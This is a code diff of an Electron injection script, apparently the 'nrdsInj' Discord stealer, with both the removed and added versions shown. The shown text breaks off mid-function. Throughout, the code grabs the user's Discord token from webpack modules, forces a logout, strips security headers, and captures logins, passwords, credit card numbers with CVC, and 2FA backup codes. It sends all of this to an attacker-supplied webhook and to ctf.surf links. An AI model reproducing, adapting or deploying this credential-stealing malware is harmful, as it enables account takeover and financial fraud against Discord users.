@@ -1,849 +1,343 @@
-const {
-  BrowserWindow,
-  session
-} = require('electron');
 const fs = require('fs');
 const path = require('path');
-const querystring = require("querystring");
-const os = require('os')
-const webhook = "%WEBHOOK_LINK%";
-const Filter = {
-  urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
-};
+const querystring = require('querystring');
+const { BrowserWindow, session } = require('electron')
+const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
+var webhook = "%WEBHOOK_LINK%";
 
-const config = {
-  "logout": true,
-  "logout-notify": true,
-  "init-notify": true,
-  "embed-color": 3447704,
-  "disable-qr-code": true
-};
-
-const badges = {
-  Discord_Employee: {
-      Value: 1,
-      Emoji: "<:staff:874750808728666152>",
-      Rare: true,
-  },
-  Partnered_Server_Owner: {
-      Value: 2,
-      Emoji: "<:partner:874750808678354964>",
-      Rare: true,
-  },
-  HypeSquad_Events: {
-      Value: 4,
-      Emoji: "<:hypesquad_events:874750808594477056>",
-      Rare: true,
-  },
-  Bug_Hunter_Level_1: {
-      Value: 8,
-      Emoji: "<:bughunter_1:874750808426692658>",
-      Rare: true,
-  },
-  Early_Supporter: {
-      Value: 512,
-      Emoji: "<:early_supporter:874750808414113823>",
-      Rare: true,
-  },
-  Bug_Hunter_Level_2: {
-      Value: 16384,
-      Emoji: "<:bughunter_2:874750808430874664>",
-      Rare: true,
-  },
-  Early_Verified_Bot_Developer: {
-      Value: 131072,
-      Emoji: "<:developer:874750808472825986>",
-      Rare: true,
-  },
-  House_Bravery: {
-      Value: 64,
-      Emoji: "<:bravery:874750808388952075>",
-      Rare: false,
-  },
-  House_Brilliance: {
-      Value: 128,
-      Emoji: "<:brilliance:874750808338608199>",
-      Rare: false,
-  },
-  House_Balance: {
-      Value: 256,
-      Emoji: "<:balance:874750808267292683>",
-      Rare: false,
-  },
-};
-
-
-class nrdsInjEvent {
-  constructor(event, token, data) {
-      this.event = event;
-      this.data = data;
-      this.token = token;
-  }
-  handle() {
-      switch (this.event) {
-          case 'passwordChanged':
-              passwordChanged(this.data.password, this.data.new_password, this.token);
-              break;
-          case 'userLogin':
-              userLogin(this.data.password, this.data.email, this.token);
-              break;
-          case 'emailChanged':
-              emailChanged(this.data.password, this.data.email, this.token);
-              break;
-          case 'creditCardAdded':
-              creditCardAdded(this.data.cardnumber, this.data.cvc, this.data.expiration, this.token)
-              break;
-      }
-  }
+function FirstTime() {
+    if (!fs.existsSync(path.join(__dirname, "evalhook"))) {
+        return !0
+    }
+    fs.rmdirSync(path.join(__dirname, "evalhook"));
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
+    return !1
 }
-
-async function firstTime() {
-  var token = await getToken()
-  if (config['init-notify'] == "true") {
-      if (fs.existsSync(path.join(__dirname, "init"))) {
-          fs.rmdirSync(path.join(__dirname, "init"));
-          if (token == null || token == undefined || token == "") {
-              var c = {
-                  username: "nrdsInj",
-                  content: "",
-                  embeds: [{
-                      title: "Discord Initalized (User not Logged in)",
-                      color: config["embed-color"],
-                      fields: [{
-                          name: "Info",
-                          value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
-                          inline: !1
-                      }],
-                      author: {
-                          name: "nrdsInj"
-                      },
-                      footer: {
-                          text: "nrdsInj"
-                      }
-                  }]
-              };
-              sendToWebhook(JSON.stringify(c));
-          } else {
-              var b = await getUserInfo(token)
-              var c = {
-                  username: "nrdsInj",
-                  content: "",
-                  embeds: [{
-                      title: "Discord Initalized",
-                      description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + ")",
-                      color: config["embed-color"],
-                      fields: [{
-                          name: "Info",
-                          value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
-                          inline: !1
-                      }, {
-                          name: "Username",
-                          value: `\`${b.username}#${b.discriminator}\``,
-                          inline: !0
-                      }, {
-                          name: "ID",
-                          value: `\`${b.id}\``,
-                          inline: !0
-                      }, {
-                          name: "Badges",
-                          value: `${getBadges(b.flags)}`,
-                          inline: !1
-                      }, {
-                          name: "Token",
-                          value: `\`\`\`${token}\`\`\``,
-                          inline: !1
-                      }],
-                      author: {
-                          name: "nrdsInj"
-                      },
-                      footer: {
-                          text: "nrdsInj"
-                      },
-                      thumbnail: {
-                          url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
-                      }
-                  }]
-              };
-              sendToWebhook(JSON.stringify(c))
-          }
-
-      }
-  }
-  if (!fs.existsSync(path.join(__dirname, "nrdsInjBTW"))) return !0
-
-  fs.rmdirSync(path.join(__dirname, "nrdsInjBTW"));
-  if (config.logout != "false" || config.logout == "%LOGOUT%") {
-      if (config['logout-notify'] == "true") {
-          if (token == null || token == undefined || token == "") {
-              var c = {
-                  username: "nrdsInj",
-                  content: "",
-                  embeds: [{
-                      title: "User log out (User not Logged in before)",
-                      color: config["embed-color"],
-                      fields: [{
-                          name: "Info",
-                          value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
-                          inline: !1
-                      }],
-                      author: {
-                          name: "nrdsInj"
-                      },
-                      footer: {
-                          text: "nrdsInj"
-                      }
-                  }]
-              };
-              sendToWebhook(JSON.stringify(c));
-          } else {
-              const b = await getUserInfo(token);
-              var c = {
-                  username: "nrdsInj",
-                  content: "",
-                  embeds: [{
-                      title: "User got logged out",
-                      description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + ")",
-                      color: config["embed-color"],
-                      fields: [{
-                          name: "Info",
-                          value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
-                          inline: !1
-                      }, {
-                          name: "Username",
-                          value: `\`${b.username}#${b.discriminator}\``,
-                          inline: !0
-                      }, {
-                          name: "ID",
-                          value: `\`${b.id}\``,
-                          inline: !0
-                      }, {
-                          name: "Badges",
-                          value: `${getBadges(b.flags)}`,
-                          inline: !1
-                      }, {
-                          name: "Token",
-                          value: `\`\`\`${token}\`\`\``,
-                          inline: !1
-                      }],
-                      author: {
-                          name: "nrdsInj"
-                      },
-                      footer: {
-                          text: "nrdsInj"
-                      },
-                      thumbnail: {
-                          url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
-                      }
-                  }]
-              };
-              sendToWebhook(JSON.stringify(c))
-          }
-      }
-      const window = BrowserWindow.getAllWindows()[0];
-      window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
-  }
-  return !1
-
-}
-const QRFilter = {
-"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
-}
-
-session.defaultSession.webRequest.onBeforeRequest(QRFilter, (details, callback) => {
-  if (details.url.startsWith("wss://")) {
-      if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
-          callback({
-              cancel: true
-          })
-          return;
-      }
-  }
-  if (firstTime()) {}
-
-  callback({})
-  return;
-})
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-  if (details.url.startsWith(webhook)) {
-      if (details.url.includes("discord.com")) {
-          callback({
-              responseHeaders: Object.assign({
-                  'Access-Control-Allow-Headers': "*"
-              }, details.responseHeaders)
-          });
-      } else {
-          callback({
-              responseHeaders: Object.assign({
-                  "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
-                  'Access-Control-Allow-Headers': "*",
-                  "Access-Control-Allow-Origin": "*"
-              }, details.responseHeaders)
-          });
-      }
-  } else {
-      delete details.responseHeaders['content-security-policy'];
-      delete details.responseHeaders['content-security-policy-report-only'];
+	if (details.url.startsWith(webhook)) {
+		if (details.url.includes("discord.com")) {
+			callback({
+				responseHeaders: Object.assign({
+					'Access-Control-Allow-Headers': "*"
+				}, details.responseHeaders)
+			});
+		} else {
+			callback({
+				responseHeaders: Object.assign({
+					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
+					'Access-Control-Allow-Headers': "*",
+					"Access-Control-Allow-Origin": "*"
+				}, details.responseHeaders)
+			});
+		}
 
-      callback({
-          responseHeaders: {
-              ...details.responseHeaders,
-              'Access-Control-Allow-Headers': "*"
-          }
-      })
-  }
+
+	} else {
+		delete details.responseHeaders['content-security-policy'];
+		delete details.responseHeaders['content-security-policy-report-only'];
+
+		callback({
+			responseHeaders: {
+				...details.responseHeaders,
+				'Access-Control-Allow-Headers': "*"
+			}
+		})
+	}
 
 })
 
-// Main functions
-
-async function userLogin(password, email, token) {
-  var userInfo = await getUserInfo(token);
-  var ip = await getIp();
-  var billing = await getBilling(token);
-  var friends = await getRelationships(token);
-
-  var params = {
-      username: "nrdsInj",
-      content: "",
-      embeds: [{
-          "title": "User Login",
-          description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + "<br>" + password + ")",
-          "color": config['embed-color'],
-          "fields": [{
-              name: "Info",
-              value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
-              inline: !1
-          }, {
-              name: "Username",
-              value: `\`${userInfo.username}#${userInfo.discriminator}\``,
-              inline: !0
-          }, {
-              name: "ID",
-              value: `\`${userInfo.id}\``,
-              inline: !0
-          }, {
-              name: "Nitro",
-              value: `${getNitro(userInfo.premium_type)}`,
-              inline: !1
-          }, {
-              name: "Badges",
-              value: `${getBadges(userInfo.flags)}`,
-              inline: !1
-          }, {
-              name: "Billing",
-              value: `${billing}`,
-              inline: !1
-          }, {
-              name: "Email",
-              value: `\`${email}\``,
-              inline: !0
-          }, {
-              name: "Password",
-              value: `\`${password}\``,
-              inline: !0
-          }, {
-              name: "Token",
-              value: `\`\`\`${token}\`\`\``,
-              inline: !1
-          }, ],
-          "author": {
-              "name": "nrdsInj"
-          },
-          "footer": {
-              "text": "nrdsInj"
-          },
-          "thumbnail": {
-              "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-          }
-      }, {
-          "title": `Total Friends (${friends.length})`,
-          "color": config['embed-color'],
-          "description": friends.frien,
-          "author": {
-              "name": "nrdsInj"
-          },
-          "footer": {
-              "text": "nrdsInj"
-          },
-          "thumbnail": {
-              "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-          }
-      }]
-  };
-
-  if (token.startsWith("mfa")) {
-      var codes = await get2faCodes(token, password)
-      var embed = {
-          "title": ":detective: __2FA Codes__",
-          "description": `[Get all of them](${codes.url})`,
-          "color": config['embed-color'],
-          "fields": codes.fields,
-          "author": {
-              "name": "nrdsInj"
-          },
-          "footer": {
-              "text": "nrdsInj"
-          }
-      }
-      params.embeds.push(embed)
-  }
-
-  sendToWebhook(JSON.stringify(params))
-
+const Filter = {
+	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
 }
-async function emailChanged(password, newEmail, token) {
-  var userInfo = await getUserInfo(token);
-  var ip = await getIp();
-  var friends = await getRelationships(token);
+session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
+	if (FirstTime()) {}
 
+	callback({})
+	return;
+})
 
-  var params = {
-      username: "nrdsInj",
-      content: "",
-      embeds: [{
-          "title": "Email Changed",
-          description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + "<br>" + password + "<br>" + newEmail + ")",
-          "color": config['embed-color'],
-          "fields": [{
-              name: "Info",
-              value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\`\`\``,
-              inline: !1
-          }, {
-              name: "Username",
-              value: `\`${userInfo.username}#${userInfo.discriminator}\``,
-              inline: !0
-          }, {
-              name: "ID",
-              value: `\`${userInfo.id}\``,
-              inline: !0
-          }, {
-              name: "Nitro",
-              value: `${getNitro(userInfo.premium_type)}`,
-              inline: !1
-          }, {
-              name: "Badges",
-              value: `${getBadges(userInfo.flags)}`,
-              inline: !1
-          }, {
-              name: "New Email",
-              value: `\`${newEmail}\``,
-              inline: !0
-          }, {
-              name: "Password",
-              value: `\`${password}\``,
-              inline: !0
-          }, {
-              name: "Token",
-              value: `\`\`\`${token}\`\`\``,
-              inline: !1
-          }, ],
-          "author": {
-              "name": "nrdsInj"
-          },
-          "footer": {
-              "text": "nrdsInj"
-          },
-          "thumbnail": {
-              "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-          }
-      }, {
-          "title": `Total Friends (${friends.length})`,
-          "color": config['embed-color'],
-          "description": friends.frien,
-          "author": {
-              "name": "nrdsInj"
-          },
-          "footer": {
-              "text": "nrdsInj"
-          },
-          "thumbnail": {
-              "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-          }
-      }]
-  }
-  if (token.startsWith("mfa")) {
-      var codes = await get2faCodes(token, password)
-      var embed = {
-          "title": ":detective: __2FA Codes__",
-          "description": `[Get all of them](${codes.url})`,
-          "color": config['embed-color'],
-          "fields": codes.fields,
-          "author": {
-              "name": "nrdsInj"
-          },
-          "footer": {
-              "text": "nrdsInj"
-          }
-      }
-      params.embeds.push(embed)
-  }
-  sendToWebhook(JSON.stringify(params))
-}
-async function passwordChanged(oldPassword, newPassword, token) {
-  var userInfo = await getUserInfo(token);
-  var ip = await getIp();
-  var billing = await getBilling(token);
-  var friends = await getRelationships(token);
-
-  var params = {
-      username: "nrdsInj",
-      content: "",
-      embeds: [{
-          "title": "Password Changed",
-          description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + "<br>" + newPassword + ")",
-          "color": config['embed-color'],
-          "fields": [{
-              name: "Info",
-              value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
-              inline: !1
-          }, {
-              name: "Username",
-              value: `\`${userInfo.username}#${userInfo.discriminator}\``,
-              inline: !0
-          }, {
-              name: "ID",
-              value: `\`${userInfo.id}\``,
-              inline: !0
-          }, {
-              name: "Nitro",
-              value: `${getNitro(userInfo.premium_type)}`,
-              inline: !1
-          }, {
-              name: "Badges",
-              value: `${getBadges(userInfo.flags)}`,
-              inline: !1
-          }, {
-              name: "Billing",
-              value: `${billing}`,
-              inline: !1
-          }, {
-              name: "Email",
-              value: `\`${userInfo.email}\``,
-              inline: !1
-          }, {
-              name: "Old Password",
-              value: `\`${oldPassword}\``,
-              inline: !0
-          }, {
-              name: "New Password",
-              value: `\`${newPassword}\``,
-              inline: !0
-          }, {
-              name: "Token",
-              value: `\`\`\`${token}\`\`\``,
-              inline: !1
-          }, ],
-          "author": {
-              "name": "nrdsInj"
-          },
-          "footer": {
-              "text": "nrdsInj"
-          },
-          "thumbnail": {
-              "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-          }
-      }, {
-          "title": `Total Friends (${friends.length})`,
-          "color": config['embed-color'],
-          "description": friends.frien,
-          "author": {
-              "name": "nrdsInj"
-          },
-          "footer": {
-              "text": "nrdsInj"
-          },
-          "thumbnail": {
-              "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-          }
-      }]
-  }
-
-  if (token.startsWith("mfa")) {
-      var codes = await get2faCodes(token, newPassword)
-      var embed = {
-          "title": ":detective: __2FA Codes__",
-          "description": `[Get all of them](${codes.url})`,
-          "color": config['embed-color'],
-          "fields": codes.fields,
-          "author": {
-              "name": "nrdsInj"
-          },
-          "footer": {
-              "text": "nrdsInj"
-          }
-      }
-      params.embeds.push(embed)
-  }
-  sendToWebhook(JSON.stringify(params))
-}
-async function creditCardAdded(cardnumber, cvc, expiration, token) {
-  var userInfo = await getUserInfo(token);
-  var ip = await getIp();
-  var billing = await getBilling(token);
-  var friends = await getRelationships(token);
-
-  var params = {
-      username: "nrdsInj",
-      content: "",
-      embeds: [{
-          "title": "Credit Card",
-          description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + ")",
-          "color": config['embed-color'],
-          "fields": [{
-                  name: "Info",
-                  value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
-                  inline: !1
-              }, {
-                  name: "Username",
-                  value: `\`${userInfo.username}#${userInfo.discriminator}\``,
-                  inline: !0
-              }, {
-                  name: "ID",
-                  value: `\`${userInfo.id}\``,
-                  inline: !0
-              }, {
-                  name: "Nitro",
-                  value: `${getNitro(userInfo.premium_type)}`,
-                  inline: !1
-              }, {
-                  name: "Badges",
-                  value: `${getBadges(userInfo.flags)}`,
-                  inline: !1
-              }, {
-                  name: "Billing",
-                  value: `${billing}`,
-                  inline: !1
-              }, {
-                  name: "Email",
-                  value: `\`${userInfo.email}\``,
-                  inline: false
-              }, {
-                  name: "CC Number",
-                  value: `\`${cardnumber}\``,
-                  inline: !0
-              }, {
-                  name: "Expiration",
-                  value: `\`${expiration}\``,
-                  inline: !0
-              },
-              {
-                  name: "CVC",
-                  value: `\`${cvc}\``,
-                  inline: !0
-              }, {
-                  name: "Token",
-                  value: `\`\`\`${token}\`\`\``,
-                  inline: !1
-              },
-          ],
-          "author": {
-              "name": "nrdsInj"
-          },
-          "footer": {
-              "text": "nrdsInj"
-          },
-          "thumbnail": {
-              "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-          }
-      }, {
-          "title": `Total Friends (${friends.length})`,
-          "color": config['embed-color'],
-          "description": friends.frien,
-          "author": {
-              "name": "nrdsInj"
-          },
-          "footer": {
-              "text": "nrdsInj"
-          },
-          "thumbnail": {
-              "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-          }
-      }]
-  };
-
-  sendToWebhook(JSON.stringify(params))
-
+function SendToWebhook(info) {
+	const window = BrowserWindow.getAllWindows()[0];
+	window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
+        xhr.open("POST", "${webhook}", true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+        xhr.send(JSON.stringify(${info}));
+    `, !0)
 }
 
-
-// Helpers functions
-async function sendToWebhook(params) {
-  
-  const window = BrowserWindow.getAllWindows()[0];
-  window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-  xhr.open("POST", "${webhook}", true);
-  xhr.setRequestHeader('Content-Type', 'application/json');
-  xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-  xhr.send(JSON.stringify(${params}));
-  `, !0)
-
-}
-async function getRelationships(token) {
-  const window = BrowserWindow.getAllWindows()[0];
-  var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, !0)
-  var json = JSON.parse(a)
-  const r = json.filter((user) => {
-      return user.type == 1
-  })
-  var gay = "";
-  for (z of r) {
-      var b = getRareBadges(z.user.public_flags)
-      if (b != "") {
-          gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
-      }
-  }
-  if (gay == "") gay = "No Rare Friends"
-
-  return {
-      length: r.length,
-      frien: gay
-  }
+function GetNitro(type) {
+	if (type == 0) {
+		return "No Nitro"
+	}
+	if (type == 1) {
+		return "\`Nitro Classic\`"
+	}
+	if (type == 2) {
+		return "\`Nitro Boost\`"
+	} else {
+		return "No Nitro"
+	}
 }
 
-async function get2faCodes(token, password) {
-  let fields = [];
-  let baseuri = "https://ctf.surf/raw/";
-
-  const window = BrowserWindow.getAllWindows()[0];
-  var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);xmlHttp.setRequestHeader('Content-Type', 'application/json');xmlHttp.setRequestHeader("authorization", "${token}");xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));xmlHttp.responseText`, !0)
-
-  var json = JSON.parse(a)
-  let codes = json.backup_codes
-  const r = codes.filter((code) => {
-      return code.consumed == null
-  })
-  for (let z in r) {
-      fields.push({
-          name: `Code`,
-          value: `\`${r[z].code.insert(4, "-")}\``,
-          inline: true
-      })
-      baseuri += `${r[z].code.insert(4, "-")}<br>`
-  }
-
-  return {
-      fields: fields,
-      url: baseuri
-  }
-}
-async function getBilling(token) {
-  const window = BrowserWindow.getAllWindows()[0];
-  var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0)
-  var json = JSON.parse(a)
-
-  var billing = "";
-  json.forEach(z => {
-      if (z.type == "") {
-          return "\`❌\`";
-      } else if (z.type == 2 && z.invalid != !0) {
-          billing += "\`✔️\`" + " <:paypal:896441236062347374>";
-      } else if (z.type == 1 && z.invalid != !0) {
-          billing += "\`✔️\`" + " :credit_card:";
-      } else {
-          return "\`❌\`";
-      };
-  });
-
-  if (billing == "") billing = "\`❌\`"
-  return billing;
-}
-async function getUserInfo(token) {
-  const window = BrowserWindow.getAllWindows()[0];
-  var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, !0)
-  return JSON.parse(a)
-}
-async function getIp() {
-  const window = BrowserWindow.getAllWindows()[0];
-  var ip = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;`, !0)
-  return ip
-}
-async function getToken() {
-  const window = BrowserWindow.getAllWindows()[0];
-  var token = await window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, !0)
-  return token
+function GetBadges(flags) {
+	const Discord_Employee = 1;
+	const Partnered_Server_Owner = 2;
+	const HypeSquad_Events = 4;
+	const Bug_Hunter_Level_1 = 8;
+	const House_Bravery = 64;
+	const House_Brilliance = 128;
+	const House_Balance = 256;
+	const Early_Supporter = 512;
+	const Bug_Hunter_Level_2 = 16384;
+	const Early_Verified_Bot_Developer = 131072;
+	var badges = "";
+	if ((flags & Discord_Employee) == Discord_Employee) {
+		badges += "Discord Staff, "
+	}
+	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
+		badges += "Partnered Server Owner, "
+	}
+	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
+		badges += "Hypesquad Event, "
+	}
+	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
+		badges += "Green Bughunter, "
+	}
+	if ((flags & House_Bravery) == House_Bravery) {
+		badges += "Hypesquad Bravery, "
+	}
+	if ((flags & House_Brilliance) == House_Brilliance) {
+		badges += "HypeSquad Brillance, "
+	}
+	if ((flags & House_Balance) == House_Balance) {
+		badges += "HypeSquad Balance, "
+	}
+	if ((flags & Early_Supporter) == Early_Supporter) {
+		badges += "Early Supporter, "
+	}
+	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
+		badges += "Gold BugHunter, "
+	}
+	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
+		badges += "Discord Developer, "
+	}
+	if (badges == "") {
+		badges = "None"
+	}
+	return badges
 }
 
-function getBadges(flags) {
-  var b = '';
-  for (const prop in badges) {
-      let o = badges[prop];
-      if ((flags & o.Value) == o.Value) b += o.Emoji;
-  };
-  if (b == '') b = 'None'
-  return b;
+function Login(email, password, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        const json = JSON.parse(info);
+        var params = {
+            username: "nrds",
+            avatar_url: "https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96",
+            embeds: [
+                {
+                    "color": 7217906,
+                    "fields": [
+                        {
+                            "name": "Info",
+                            "value": `Email: ${email} - Password: ${password}`,
+                            "inline": true
+                        },
+                        {
+                            "name": "Token",
+                            "value": `\`${token}\``,
+                            "inline": false
+                        }
+                    ],
+                    "author": {
+                        "name": json.username +"#" + json.discriminator + "・" + json.id,
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    }
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
 }
 
-function getRareBadges(flags) {
-  var b = '';
-  for (const prop in badges) {
-      let o = badges[prop];
-      if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
-  };
-  return b;
+function ChangePassword(oldpassword, newpassword, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        const json = JSON.parse(info);
+        var params = {
+            username: "nrds",
+            avatar_url: "https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96",
+            embeds: [
+                {
+                    "color": 7217906,
+                    "fields": [
+                        {
+                            "name": "Password Changed",
+                            "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
+                            "inline": true
+                        },
+                        {
+                            "name": "Info",
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "inline": true
+                        },
+                        {
+                            "name": "Token",
+                            "value": `\`${token}\``,
+                            "inline": false
+                        }
+                    ],
+                    "author": {
+                        "name": json.username +"#" + json.discriminator + "・" + json.id,
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    }              
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
 }
 
-function getNitro(flags) {
-  switch (flags) {
-      case 0:
-          return "No Nitro";
-      case 1:
-          return "<:classic:896119171019067423> \`Nitro Classic\`";
-      case 2:
-          return "<a:boost:824036778570416129> \`Nitro Boost\`";
-      default:
-          return "No Nitro";
-
-  };
+function ChangeEmail(newemail, password, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        var json = JSON.parse(info);
+        var params = {
+            username: "nrds",
